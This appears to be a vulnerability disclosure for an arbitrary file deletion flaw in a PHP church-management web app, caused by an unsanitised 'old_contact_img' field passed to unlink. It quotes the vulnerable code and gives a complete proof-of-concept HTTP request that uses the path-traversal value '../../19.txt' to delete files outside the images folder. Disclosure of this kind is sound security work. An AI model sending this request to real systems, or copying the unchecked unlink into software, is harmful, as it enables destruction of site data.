### Vulnerability file address

In line 447 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_contact_img']);`,` $_POST['old_contact_img']` parameters have not been restricted, which causes any file to be deleted

```php
 if ($_FILES['contactphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["contactphoto"]["name"]);

            if (move_uploaded_file($_FILES["contactphoto"]["tmp_name"], $filepath)) {
                $img8 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_contact_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 381

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_contact_img"

../../19.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="contactphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `19.txt` file in the `church/` directory

![image-20250505163407465](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051634505.png)

Then we execute the above poc to attack

![image-20250505163417344](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051634371.png)

Files are deleted after the attack is successful

![image-20250505163425862](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051634899.png)